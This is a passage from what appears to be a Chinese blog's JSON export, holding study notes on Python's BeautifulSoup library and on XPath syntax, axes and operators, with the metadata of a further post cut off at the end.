Python标准库 BeautifulSoup(markup, &quot;html.parser&quot;) Python的内置标准库执行速度适中文档容错能力强 Python 2.7.3 or 3.2.2)前 的版本中文档容错能力差 lxml HTML 解析器 BeautifulSoup(markup, &quot;lxml&quot;) 速度快文档容错能力强 需要安装C语言库 lxml XML 解析器 BeautifulSoup(markup, [&quot;lxml-xml&quot;]) BeautifulSoup(markup, &quot;xml&quot;) 速度快唯一支持XML的解析器 需要安装C语言库 html5lib BeautifulSoup(markup, &quot;html5lib&quot;) 最好的容错性以浏览器的方式解析文档生成HTML5格式的文档 速度慢不依赖外部扩展 对象的种类 Beautiful Soup将复杂HTML文档转换成一个复杂的树形结构,每个节点都是Python对象,所有对象可以归纳为4种: Tag , NavigableString , BeautifulSoup , Comment . Tag tag对象与XML或HTML原生文档中的tag相同： 1234soup = BeautifulSoup(&#x27;&lt;b class=&quot;boldest&quot;&gt;Extremely bold&lt;/b&gt;&#x27;)tag = soup.btype(tag)# &lt;class &#x27;bs4.element.Tag&#x27;&gt; tag具有非常多的属性和方法，其中比较重要的是name和attributes Name 即该tag对象的标签名： 1print(tag.name) # b 如果改变了tag的name，将影响所有通过当前BeautifulSoup对象生成的Html文档。 Attributes 在HTML中，标签往往包含许多属性，而使用BeautifulSoup可以很方便的操作这些属性。在BS4中操作实现和使用python的dict一样： 1tag[&#x27;class&#x27;] # blodest 也可以直接使用.进行访问： 1tag.attrs # &#123;&#x27;class&#x27;:&#x27;boldest&#x27;&#125; 可见访问tag的attrs将返回一个dict tag属性可以被添加，删除或是修改，和操作字典的方式相同: 1234567891011121314tag[&#x27;class&#x27;] = &#x27;verybold&#x27;tag[&#x27;id&#x27;] = 1tag# &lt;blockquote class=&quot;verybold&quot; id=&quot;1&quot;&gt;Extremely bold&lt;/blockquote&gt;del tag[&#x27;class&#x27;]del tag[&#x27;id&#x27;]tag# &lt;blockquote&gt;Extremely bold&lt;/blockquote&gt;tag[&#x27;class&#x27;]# KeyError: &#x27;class&#x27;print(tag.get(&#x27;class&#x27;))# None 多值属性 HTML中允许某一属性有很多值，最典型的就是class属性，还有一些比如rel，rev，accept-charset，headers，accesskey，在BS中，多值属性以list的形式返回： 1234567css_soup = BeautifulSoup(&#x27;&lt;p class=&quot;body strikeout&quot;&gt;&lt;/p&gt;&#x27;)css_soup.p[&#x27;class&#x27;]# [&quot;body&quot;, &quot;strikeout&quot;]css_soup = BeautifulSoup(&#x27;&lt;p class=&quot;body&quot;&gt;&lt;/p&gt;&#x27;)css_soup.p[&#x27;class&#x27;]# [&quot;body&quot;] 但对于一些没有被HTML定义为多值的属性，比如id，有时它们的值却看起来像多值，比如一下例子： 12id_soup = BeautifulSoup(&#x27;&lt;p id = &#x27;my id&#x27;&gt;&lt;/p&gt;&#x27;)id_soup.p[id] # &#x27;my id&#x27; 可见这样的虽然看起来是多值的属性，只要它没有被HTML标准定义为多值属性，结果就会以字符串的形式输出。 如果将文档解析为XML格式，那么tag中将不包含多值属性，所有属性均以字符串返回： 123xml_soup = BeautifulSoup(&#x27;&lt;p class=&quot;body strikeout&quot;&gt;&lt;/p&gt;&#x27;, &#x27;xml&#x27;)xml_soup.p[&#x27;class&#x27;]# u&#x27;body strikeout&#x27; NavigableString 当我们获取tag中包裹的文本时，BS会用一个NavigableString来包装该字符串： 1234tag.string# &#x27;Extremely bold&#x27;type(tag.string)# &lt;class &#x27;bs4.element.NavigableString&#x27;&gt; NavigableString实际上是封装了一些特性的Unicode字符串，通过str()方法可以最直接将navigableString对象转化为Unicode String： 1234unicode_strinng = unicode(tag.string)print(unicode_string) # Extremely boldtype(unicode_string)# &lt;type &#x27;str&#x27;&gt; 此外，tag中通包含的字符串不能编辑，但是可以进行替换，使用replace_with()方法： 123tag.string.replace_with(&quot;No longer bold&quot;)print(tag)# &lt;blockquote&gt;No longer bold&lt;/blockquote&gt; 如果想在Beautiful Soup之外使用 NavigableString 对象,需要调用 unicode() 方法,将该对象转换成普通的Unicode字符串,否则就算Beautiful Soup已方法已经执行结束，我们的String对象也会包含一个指向整个BeautifulSoup 解析树的引用。这样会浪费内存. BeautifulSoup BeautifulSoup对象代表了整个被解析过的文件，很多时候我们可以将其看作是一个Tag对象。 我们也能将BeautifulSoup对象传入一些修改解析树的函数，例如我们想合并两个结构文档： 1234567doc = BeautifulSoup(&quot;&lt;head&gt;INSERT FOOTER HERE&lt;/head&gt;&quot;, &quot;xml&quot;)foot = BeautifulSoup(&quot;&lt;footer&gt;Here is the footer&lt;/footer&gt;&quot;, &quot;xml&quot;)doc.head.string.replace_with(foot)print(doc)# &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;# &lt;head&gt;&lt;footer&gt;Here is the footer&lt;/footer&gt;&lt;/head&gt; 而由于BeautifukSoup对象并没有真正的指向某个HTML或XML标签，因此，它并不包含明确的标签名和属性集合，但有时访问它的标签名又是必要的，因此该对象被给与了一个特殊的标签名[document]： 1234soup.name# [document]soup.attrs# &#123;&#125; comment 和特殊字串 使用Tag、NavigableString和BeautifulSoup可以涵盖大部分HTML或XML文件中出现的内容，但还有些并不那么经常出现的特殊内容，例如注释： 12345markup = &quot;&lt;b&gt;&lt;!-- Hey, buddy. Want to buy a used parser? --&gt;&lt;/b&gt;&quot;soup = BeautifulSoup(markup, &quot;lxml&quot;)comment = soup.b.stringprint(type(comment))# &lt;class &#x27;bs4.element.Comment&#x27;&gt; 事实上Comment对象就是一种特殊的NavigableString： 12print(isinstance(comment, NavigableString))# True 输出格式化后的形式如下： 12345678print(soup.prettify())# &lt;html&gt;# &lt;body&gt;# &lt;b&gt;# &lt;!-- Hey, buddy. Want to buy a used parser? --&gt;# &lt;/b&gt;# &lt;/body&gt;# &lt;/html&gt; BeautifulSoup中也定义了一些类：Stylesheet、Script、TemplateString，分别对应了HTML中的&lt;style&gt;标签中的内容，&lt;script&gt;标签中的内容以及&lt;template&gt;标签中的内容。这些类都是NavigableString的子类。做这样的区分是为了更好的找出页面的主要部分。这些类是在BeautifulSoup4.9.0版本新增，html5lib中并不包含这些类。 而在XML中，还有许多特殊标签，比如CData、ProcessingInstruction、Declaration、Doctype。这些类和Comment一样都是Navigable String的子类。 12345678910111213from bs4.element import CDatacdata = CData(&quot;A CDATA block&quot;)comment.replace_with(cdata)print(soup.b.prettify())# &lt;html&gt;# &lt;body&gt;# &lt;b&gt;# &lt;![CDATA[A CDATA block &lt;]]&gt;# &lt;/b&gt;# &lt;/body&gt;# &lt;/html&gt; 遍历文档树 接下来我们会使用下面的例子进行举例： 12345678910111213141516html_doc = &quot;&quot;&quot;&lt;html&gt;&lt;head&gt;&lt;title&gt;The Dormouse&#x27;s story&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;p class=&quot;title&quot;&gt;&lt;b&gt;The Dormouse&#x27;s story&lt;/b&gt;&lt;/p&gt;&lt;p class=&quot;story&quot;&gt;Once upon a time there were three little sisters; and their names were&lt;a href=&quot;http://example.com/elsie&quot; class=&quot;sister&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;,&lt;a href=&quot;http://example.com/lacie&quot; class=&quot;sister&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt; and&lt;a href=&quot;http://example.com/tillie&quot; class=&quot;sister&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;;and they lived at the bottom of a well.&lt;/p&gt;&lt;p class=&quot;story&quot;&gt;...&lt;/p&gt;&quot;&quot;&quot;from bs4 import BeautifulSoupsoup = BeautifulSoup(html_doc, &#x27;html.parser&#x27;) 向下遍历 BeautifulSoup为我们提供了很多用于遍历的属性，但NavigableString是无法使用这些属性的，因为它们不包含子节点。 按标签名遍历 最简单的遍历方式就是通过标签名遍历，但这种遍历方式只会为你找出当前节点下的第一个同名子节点： 12soup.a# &lt;a href=&quot;http://example.com/elsie&quot; class=&quot;sister&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt; 如果想要获得所有同名子标签，那么需要使用find_all函数查找所有标签。 1234soup.find_all(&#x27;a&#x27;)# [&lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;,# &lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;,# &lt;a class=&quot;sister&quot; href=&quot;http://example.com/tillie&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;] contents和children contents是tag对象所包含的一个list，该属性包含了该标签下的所有直系子标签 1234567891011soup_test = BeautifulSoup(html_doc_test, &#x27;lxml&#x27;)tag = soup_test.bodyprint(tag.contents)# [&#x27;\\n&#x27;, &lt;p class=&quot;title&quot;&gt;&lt;b&gt;The Dormouse&#x27;s story&lt;/b&gt;&lt;/p&gt;, &#x27;\\n&#x27;, &lt;p class=&quot;story&quot;&gt;Once upon a time there were three little sisters; and their names were# &lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;,# &lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt; and# &lt;a class=&quot;sister&quot; href=&quot;http://example.com/tillie&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;;# and they lived at the bottom of a well.&lt;/p&gt;, &#x27;\\n&#x27;, &lt;p class=&quot;story&quot;&gt;...&lt;/p&gt;, &#x27;\\n&#x27;]print(tag.contents[1].contents[0].contents)# [&quot;The Dormouse&#x27;s story&quot;] BeautifulSoup对象本身也包含子节点，我们认为BeautifulSoup对象只包含一个&lt;html&gt;子标签： 1234print(len(soup_test.contents))# 1print(soup_test.contents[0].name)# html 需要注意的是NavigableString对象并不包含这两个属性。 contents是返回list对象，而children则是返回一个包含所有直系子节点的generator： 12for child in soup_test.body.children: print(child) descendants 相比于contents和children返回直系子节点，descendants则是返回所有子节点。 例如，对于如下标签的子节点： 123headTag = soup_test.headprint(headTag.contents)# [&lt;title&gt;The Dormouse&#x27;s story&lt;/title&gt;] 该节点的子标签只有&lt;title&gt;但是，从BeautifulSoup对象的角度来看，标签&lt;title&gt;还有一个子节点NavigableString，但我们是用.children进行遍历时，无法遍历到该NavigableString 此时我们尝试使用decendants进行遍历： 1234for child in headTag.descendants: print(child)# &lt;title&gt;The Dormouse&#x27;s story&lt;/title&gt;# The Dormouse&#x27;s story 对于BeautifulSoup对象而言，它的children只包含一个子节点，而descendants则包含整个html解析树中的所有结点： 12print(len(soup_test.contents)) # 1print(len(list(soup_test.descendants))) # 26 string 当某一标签仅包含一个子节点，且该子节点为NavigableString对象时，可以调用该节点的String属性，如果该标签不仅包含一个NavigableString对象节点，则访问该对象的String属性时将会返回None 1234print(soup_test.string)print(headTag.title.string)# None# The Dormouse&#x27;s story string &amp; stripped_strings 当某个标签之内不仅包含一个NavigableString对象时，可以使用strings遍历该标签下的所有NavigableString对象。该属性返回一个包含所有子NavigableString的生成器 123456789101112131415161718for string in soup_test.strings: print(string)# The Dormouse&#x27;s story# &#x27;\\n&#x27;# Once upon a time there were three little sisters; and their names were# &#x27;\\n&#x27;# Elsie# ,# &#x27;\\n&#x27;# Lacie# and# &#x27;/n&#x27;# Tillie# ;# and they lived at the bottom of a well.# &#x27;/n&#x27;# ...# &#x27;/n&#x27; 可见使用该方法访问时，回车也会被遍历到，如果不想单行的回车也被视为NavigableString对象，则需要使用stripped_strings，该属性将返回除\\n以外的所有NavigableString对象 12345678910111213for string in soup_test.stripped_strings: print(string)# The Dormouse&#x27;s story# The Dormouse&#x27;s story# Once upon a time there were three little sisters; and their names were# Elsie# ,# Lacie# and# Tillie# ;# and they lived at the bottom of a well.# ... 向上遍历 parent 对于每个节点，可以通过parent属性访问该节点上一层的节点，例如&lt;title&gt;的上层节点为&lt;head&gt;。 需要注意的是几种特殊节点的parent： NavigableString对象的parent上层节点为包裹该字串的标签 类似&lt;html&gt;的顶层标签的上层节点为BeautifulSoup对象。 而BeautifulSoup对象的上层节点则为None 1234567891011121314print(&#x27;--------&#x27;)title_tag = soup_test.head.titleprint(title_tag)print(title_tag.parent)print(title_tag.string.parent)html_tag = soup_test.htmlprint(type(html_tag.parent))print(soup_test.parent# &lt;title&gt;The Dormouse&#x27;s story&lt;/title&gt;# &lt;head&gt;&lt;title&gt;The Dormouse&#x27;s story&lt;/title&gt;&lt;/head&gt;# &lt;title&gt;The Dormouse&#x27;s story&lt;/title&gt;# &lt;class &#x27;bs4.BeautifulSoup&#x27;&gt;# None parents parent属性只能向上访问一级，而parents则可以按层序访问所有的祖先节点 12345678910a_tag = soup_test.aprint(a_tag)for parent in a_tag.parents: print(parent.name)# &lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;# p# body# html# [document] 同级遍历 有时候某一标签包含多个子标签，这些子标签处于同一级别，我们成为siblings，当我们身处某一节点，却想要访问该节点的兄弟节点时，这样从操作称为同级遍历. 我们用如下文档进行举例： 12345678910sibling_soup = BeautifulSoup(&quot;&lt;a&gt;&lt;b&gt;text1&lt;/b&gt;&lt;c&gt;text2&lt;/c&gt;&lt;/b&gt;&lt;/a&gt;&quot;, &#x27;html.parser&#x27;)print(sibling_soup.prettify())# &lt;a&gt;# &lt;b&gt;# text1# &lt;/b&gt;# &lt;c&gt;# text2# &lt;/c&gt;# &lt;/a&gt; next_sibling &amp; previous_sibling BS4为我们提供了两种用于在同级标签之间切换的属性next_sibling和previous_sibling，这两个函数分别返回下一个标签的tag对象以及上一个标签的tag对象。如果基准元素没有下一个或上一个标签，则返回None： 12345678910111213141516sibling_soup.b.next_sibling# &lt;c&gt;text2&lt;/c&gt;sibling_soup.c.previous_sibling# &lt;b&gt;text1&lt;/b&gt;print(sibling_soup.b.previous_sibling)# Noneprint(sibling_soup.c.next_sibling)# Nonesibling_soup.b.string# &#x27;text1&#x27;print(sibling_soup.b.string.next_sibling)# None 但注意到一个问题，使用strings遍历时会发现，其中包含很多/n，这些字符也被视为NavigableString对象，因此使用这两个属性进行同级访问时也会访问到他们，例如下面这个例子： 12345678910111213# &lt;a href=&quot;http://example.com/elsie&quot; class=&quot;sister&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;# &lt;a href=&quot;http://example.com/lacie&quot; class=&quot;sister&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;# &lt;a href=&quot;http://example.com/tillie&quot; class=&quot;sister&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;link = soup.alink# &lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;link.next_sibling# &#x27;,\\n &#x27;link.next_sibling.next_sibling# &lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt; next_slibings &amp; previous_sliblings 如果需要访问与当前节点同级的所有标签，则可以使用next_slibings和previous_siblings两个属性。这两个属性分别返回一个包含所有当前节点之后的所有同级节点的生成器，和之前的所有同级节点的生成器： 12345678910111213141516for sibling in soup.a.next_siblings: print(repr(sibling))# &#x27;,\\n&#x27;# &lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;# &#x27; and\\n&#x27;# &lt;a class=&quot;sister&quot; href=&quot;http://example.com/tillie&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;# &#x27;; and they lived at the bottom of a well.&#x27;for sibling in soup.find(id=&quot;link3&quot;).previous_siblings: print(repr(sibling))# &#x27; and\\n&#x27;# &lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;# &#x27;,\\n&#x27;# &lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;# &#x27;Once upon a time there were three little sisters; and their names were\\n&#x27; next_element &amp; previous_element 该属性用于寻找当前节点的按文件解析顺序的下一个节点。 1234567891011last_a_tag = soup_test.find(&quot;a&quot;,id = &#x27;link3&#x27;)print(last_a_tag)# &lt;a class=&quot;sister&quot; href=&quot;http://example.com/tillie&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;print(last_a_tag.next_sibling)# ;# and they lived at the bottom of a well.for child in last_a_tag.children: print(child) # Tillieprint(last_a_tag.next_element)# Tillie previous_element原理相似但结果是返回在当前标签之前被解析的标签。 next_elements &amp; previous_elements 这两个属性则是返回当前标签后的解析和当前标签前需要解析的对象，下面我们使用repr函数将这些对象转换为供python解释器读取的形式以便观察： 12345678for element in last_a_tag.next_elements: print(repr(element))# &#x27;Tillie&#x27;# &#x27;;\\nand they lived at the bottom of a well.&#x27;# &#x27;\\n&#x27;# &lt;p class=&quot;story&quot;&gt;...&lt;/p&gt;# &#x27;...&#x27;# &#x27;\\n&#x27; 搜索文档树 BeautifulSoup中提供了大量用于搜索的函数，但大部分函数的参数比较相似，这里主要讨论find()和find_all()两个方法。下面主要讲解find_all方法 find_all find_all()函数， 它会将所有符合条件的内容以列表形式返回。它的构造方法如下： 1find_all(name, attrs, recursive, text, **kwargs ) name 参数可以有多种写法： （1）节点名 123print(soup.find_all(&#x27;p&#x27;))# 输出结果如下：[&lt;p class=&quot;title&quot; name=&quot;dromouse&quot;&gt;&lt;b&gt;The Dormouse&#x27;s story&lt;/b&gt;&lt;/p&gt;, &lt;p class=&quot;story&quot;&gt;Once upon a time there were three little sisters; and their names were&lt;/p&gt;] （2）正则表达式 123print(soup.find_all(re.compile(&#x27;^p&#x27;)))# 输出结果如下：[&lt;p class=&quot;title&quot; name=&quot;dromouse&quot;&gt;&lt;b&gt;The Dormouse&#x27;s story&lt;/b&gt;&lt;/p&gt;, &lt;p class=&quot;story&quot;&gt;Once upon a time there were three little sisters; and their names were&lt;/p&gt;] （3）列表 如果参数为列表，过滤标准为列表中的所有元素。看下具体代码，你就会一目了然了。 123print(soup.find_all([&#x27;p&#x27;, &#x27;a&#x27;]))# 输出结果如下：[&lt;p class=&quot;title&quot; name=&quot;dromouse&quot;&gt;&lt;b&gt;The Dormouse&#x27;s story&lt;/b&gt;&lt;/p&gt;, &lt;p class=&quot;story&quot;&gt;Once upon a time there were three little sisters; and their names were&lt;/p&gt;, &lt;a href=&quot;http://example.com/elsie&quot; class=&quot;sister&quot; id=&quot;link1&quot;&gt;&lt;!-- Elsie --&gt;&lt;/a&gt;] 另外 attrs 参数可以也作为过滤条件来获取内容，而 limit 参数是限制返回的条数。 利用CSS选择器 除了只用find函数意外，CSS选择器也是一个非常方便的搜索手段，以 CSS 语法为匹配标准找到 Tag。同样也是使用到一个函数，该函数为select()，返回类型也是 list。它的具体用法如下, 同样以 prettify() 打印的结果为前提： （1）通过 tag 标签查找 123print(soup.select(head))# 输出结果如下：# [&lt;head&gt;&lt;title&gt;The Dormouse&#x27;s story&lt;/title&gt;&lt;/head&gt;] （2）通过 id 查找 123print(soup.select(&#x27;#link1&#x27;))# 输出结果如下：# [&lt;a href=&quot;http://example.com/elsie&quot; class=&quot;sister&quot; id=&quot;link1&quot;&gt;&lt;!-- Elsie --&gt;&lt;/a&gt;] （3）通过 class 查找 123print(soup.select(&#x27;.sister&#x27;))# 输出结果如下：# [&lt;a href=&quot;http://example.com/elsie&quot; class=&quot;sister&quot; id=&quot;link1&quot;&gt;&lt;!-- Elsie --&gt;&lt;/a&gt;] （4）通过属性查找 123print(soup.select(&#x27;p[name=dromouse]&#x27;))# 输出结果如下：# [&lt;p class=&quot;title&quot; name=&quot;dromouse&quot;&gt;&lt;b&gt;The Dormouse&#x27;s story&lt;/b&gt;&lt;/p&gt;] 123print(soup.select(&#x27;p[class=title]&#x27;))# 输出结果如下：# [&lt;p class=&quot;title&quot; name=&quot;dromouse&quot;&gt;&lt;b&gt;The Dormouse&#x27;s story&lt;/b&gt;&lt;/p&gt;] （5）组合查找 1234print(soup.select(&quot;body p&quot;))# 输出结果如下：# [&lt;p class=&quot;title&quot; name=&quot;dromouse&quot;&gt;&lt;b&gt;The Dormouse&#x27;s story&lt;/b&gt;&lt;/p&gt;,# &lt;p class=&quot;story&quot;&gt;Once upon a time there were three little sisters; and their names were&lt;/p&gt;] 123print(soup.select(&quot;p &gt; a&quot;))# 输出结果如下：# [&lt;a href=&quot;http://example.com/elsie&quot; class=&quot;sister&quot; id=&quot;link1&quot;&gt;&lt;!-- Elsie --&gt;&lt;/a&gt;] 123print(soup.select(&quot;p &gt; .sister&quot;))# 输出结果如下：# [&lt;a href=&quot;http://example.com/elsie&quot; class=&quot;sister&quot; id=&quot;link1&quot;&gt;&lt;!-- Elsie --&gt;&lt;/a&gt;] 总结 至此已经可以利用BeautifulSoup来进行一些简单的HTML解析工作了。剩下的一些属性以及函数，可以在应用中学习。 在本次学习的过程中，我意识到这样看官方文档并做笔记的学习方式，效率比较低。 而且我也没办法做到将官方文档概况的面面俱到，某次和队友聊天的过程中偶然提到了目前的学习状况。队友直截了当的指出了我学习上的不足：“BS完全不值得你去做笔记学习！” 确实，现阶段我已经进入了研究生的学习阶段，我的学习也不再是通过一些相关技术来了解本专业的过程了。而应该转化为通过所学的一些技术对当前所学领域进行一些研究，解决或是发现一些领域内比较含糊的问题。 工具终究是工具，研究才是现阶段应该关注的。我认为比起依赖于笔记，作为一名合格的硕士研究生，应该养成看API文档的习惯。 参考文档 Beautiful Soup Documentation — Beautiful Soup 4.9.0 documentation","categories":[{"name":"Python","slug":"Python","permalink":"http://enderxiao.github.io/categories/Python/"},{"name":"爬虫","slug":"Python/爬虫","permalink":"http://enderxiao.github.io/categories/Python/%E7%88%AC%E8%99%AB/"}],"tags":[{"name":"爬虫","slug":"爬虫","permalink":"http://enderxiao.github.io/tags/%E7%88%AC%E8%99%AB/"},{"name":"bs4","slug":"bs4","permalink":"http://enderxiao.github.io/tags/bs4/"}]},{"title":"xpath笔记","slug":"xpath笔记","date":"2021-09-02T03:02:14.000Z","updated":"2024-07-30T11:26:33.921Z","comments":true,"path":"2021/09/02/xpath笔记/","permalink":"http://enderxiao.github.io/2021/09/02/xpath%E7%AC%94%E8%AE%B0/","excerpt":"xpath学习笔记","text":"xpath学习笔记 xpath简介 什么是 XPath? XPath 使用路径表达式在 XML 文档中进行导航 XPath 包含一个标准函数库 XPath 是 XSLT 中的主要元素 XPath 是一个 W3C 标准 Xpath 节点 节点（Node) Xpath中共7种节点： 元素 属性 文本 命名空间 处理指令 注释 文档（根）节点 XML文档被作为节点树对待，树的根被成为文档（根）节点 例如如下XML文档： 123456789101112&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;bookstore&gt;&lt;book&gt; &lt;title lang=&quot;en&quot;&gt;Harry Potter&lt;/title&gt; &lt;author&gt;J K. Rowling&lt;/author&gt; &lt;year&gt;2005&lt;/year&gt; &lt;price&gt;29.99&lt;/price&gt;&lt;/book&gt;&lt;/bookstore&gt; 上面的XML文档中的节点例子： 123&lt;bookstore&gt; （文档节点）&lt;author&gt;J K. Rowling&lt;/author&gt; （元素节点）lang=&quot;en&quot; （属性节点） 基本值（Atomic Value） 也可成为原子值，即无父或无子的节点，例如： 12J K. Rowling&quot;en&quot; 项目（Item） 项目是基本值或者节点 双亲（Parent） 每个元素以及属性都有一个双亲 如例中的book是title、author、year以及price的双亲 子（Children） 元素节点可能有0，1或多个子 如例中的title、author、year、price元素均为book的子 同胞（Sibling） 拥有相同双亲节点的元素节点 如例中，title、author、year 以及 price 元素都是同胞 先辈（Ancestor） 某节点的双亲、双亲的双亲，等等。 如例中，title 元素的先辈是 book 元素和 bookstore 元素 后代（Descendant） 某个节点的子，子的子，等等。 如例中，bookstore 的后代是 book、title、author、year 以及 price 元素 Xpath语法 选取节点 XPath使用路径表达式在XML文档中匹配节点： 表达式 描述 nodename 选取此节点的所有子节点。 / 从根节点选取。 // 从匹配选择的当前节点选择文档中的节点，而不考虑它们的位置。 . 选取当前节点。 … 选取当前节点的父节点。 @ 选取属性。 例如： 路径表达式 结果 bookstore 选取 bookstore 元素的所有子节点。 /bookstore 选取根元素 bookstore。注释：假如路径起始于正斜杠( / )，则此路径始终代表到某元素的绝对路径！ bookstore/book 选取属于 bookstore 的子元素的所有 book 元素。 //book 选取所有 book 子元素，而不管它们在文档中的位置。 bookstore//book 选择属于 bookstore 元素的后代的所有 book 元素，而不管它们位于 bookstore 之下的什么位置。 //@lang 选取名为 lang 的所有属性。 谓语（Predicates） 用来查找某个特定的节点或包含某个特定的值的节点，使用方括号将其包裹。 例如： 路径表达式 结果 /bookstore/book[1] 选取属于 bookstore 子元素的第一个 book 元素。 /bookstore/book[last()] 选取属于 bookstore 子元素的最后一个 book 元素。 /bookstore/book[last()-1] 选取属于 bookstore 子元素的倒数第二个 book 元素。 /bookstore/book[position()❤️] 选取最前面的两个属于 bookstore 元素的子元素的 book 元素。 //title[@lang] 选取所有拥有名为 lang 的属性的 title 元素。 //title[@lang=‘eng’] 选取所有 title 元素，且这些元素拥有值为 eng 的 lang 属性。 /bookstore/book[price&gt;35.00] 选取 bookstore 元素的所有 book 元素，且其中的 price 元素的值须大于 35.00。 /bookstore/book[price&gt;35.00]/title 选取 bookstore 元素中的 book 元素的所有 title 元素，且其中的 price 元素的值须大于 35.00。 选取未知节点 xpath通配符，用来选取位置的XML元素 通配符 描述 * 匹配任何元素节点。 @* 匹配任何属性节点。 node() 匹配任何类型的节点。 例如： 路径表达式 结果 /bookstore/* 选取 bookstore 元素的所有子元素。 //* 选取文档中的所有元素。 //title[@*] 选取所有带有属性的 title 元素。 选取若干路径 进行多路径选择时，使用“|”分科即可 例如： 路径表达式 结果 //book/title | //book/price 选取 book 元素的所有 title 和 price 元素。 //title | //price 选取文档中的所有 title 和 price 元素。 /bookstore/book/title | //price 选取属于 bookstore 元素的 book 元素的所有 title 元素，以及文档中所有的 price 元素。 XPath轴（Axes） 轴 轴可定位为相对于当前节点的节点集： 轴名称 结果 ancestor 选取当前节点的所有先辈（父、祖父等）。 ancestor-or-self 选取当前节点的所有先辈（父、祖父等）以及当前节点本身。 attribute 选取当前节点的所有属性。 child 选取当前节点的所有子元素。 descendant 选取当前节点的所有后代元素（子、孙等）。 descendant-or-self 选取当前节点的所有后代元素（子、孙等）以及当前节点本身。 following 选取文档中当前节点的结束标签之后的所有节点。 namespace 选取当前节点的所有命名空间节点。 parent 选取当前节点的父节点。 preceding 选取文档中当前节点的开始标签之前的所有节点。 preceding-sibling 选取当前节点之前的所有同级节点。 self 选取当前节点。 位置路径表达式 位置路径可以绝对的，也可以是相对的。 绝对路径一定其实于/，而相对路径则不会。 位置路径包括一个或多个步，每个步被斜杠划分开： 绝对位置路径： 1/step/step/... 相对位置路径： 1step/step/... 在相对路径中，每个步均根据当前节点集之中的节点来进行计算。 步（step） 步可以是： 轴（axis）——定义所选节点与当前节点之间的树关系 节点测试（node-test）——识别某个轴内部的节点 零个或者更多谓词（predicate）——更深入地提炼所选的节点集 由此可推导出步的语法： 1轴名称::节点测试[谓词] 例如： 例子 结果 child::book 选取所有属于当前节点的子元素的 book 节点。 attribute::lang 选取当前节点的 lang 属性。 child:😗 选取当前节点的所有子元素。 attribute:😗 选取当前节点的所有属性。 child::text() 选取当前节点的所有文本子节点。 child::node() 选取当前节点的所有子节点。 descendant::book 选取当前节点的所有 book 后代。 ancestor::book 选择当前节点的所有 book 先辈。 ancestor-or-self::book 选取当前节点的所有 book 先辈以及当前节点（如果此节点是 book 节点） child:😗/child::price 选取当前节点的所有 price 孙节点。 XPath 运算符 Xpath表达式可返回节点集，字符串、逻辑值，以及数字。这些返回子也可以进行一些运算，例如： 运算符 描述 实例 返回值 | 计算两个节点集 //book | //cd 返回所有拥有 book 和 cd 元素的节点集 + 加法 6 + 4 10 - 减法 6 - 4 2 * 乘法 6 * 4 24 div 除法 8 div 4 2 = 等于 price=9.80 如果 price 是 9.80，则返回 true。如果 price 是 9.90，则返回 false。 != 不等于 price!=9.80 如果 price 是 9.90，则返回 true。如果 price 是 9.80，则返回 false。 &lt; 小于 price&lt;9.80 如果 price 是 9.00，则返回 true。如果 price 是 9.90，则返回 false。 &lt;= 小于或等于 price&lt;=9.80 如果 price 是 9.00，则返回 true。如果 price 是 9.90，则返回 false。 &gt; 大于 price&gt;9.80 如果 price 是 9.90，则返回 true。如果 price 是 9.80，则返回 false。 &gt;= 大于或等于 price&gt;=9.80 如果 price 是 9.90，则返回 true。如果 price 是 9.70，则返回 false。 or 或 price=9.80 or price=9.70 如果 price 是 9.80或9.70，则返回 true。如果 price 是 9.50，则返回 false。 and 与 price&gt;9.00 and price&lt;9.90 如果 price 是 9.80，则返回 true。如果 price 是 8.50，则返回 false。 mod 计算除法的余数 5 mod 2 1","categories":[{"name":"Python","slug":"Python","permalink":"http://enderxiao.github.io/categories/Python/"},{"name":"爬虫","slug":"Python/爬虫","permalink":"http://enderxiao.github.io/categories/Python/%E7%88%AC%E8%99%AB/"},{"name":"xpath","slug":"xpath","permalink":"http://enderxiao.github.io/categories/xpath/"}],"tags":[{"name":"爬虫","slug":"爬虫","permalink":"http://enderxiao.github.io/tags/%E7%88%AC%E8%99%AB/"},{"name":"xpath","slug":"xpath","permalink":"http://enderxiao.github.io/tags/xpath/"}]},{"title":"python进阶-常用内建库","slug":"python进阶-常用内建库","date":"2021-08-17T00:54:48.000Z","updated":"2024-07-30T11:26:33.920Z","comments":true,"path":"2021/08/17/python进阶-常用内建库/","permalink":"http://enderxiao.github.io/2021/08/17/python%E8%BF%9B%E9%98%B6-%E5%B8%B8%E7%94%A8%E5%86%85%E5%BB%BA%E5%BA%93/","excerpt":"python学习笔记，常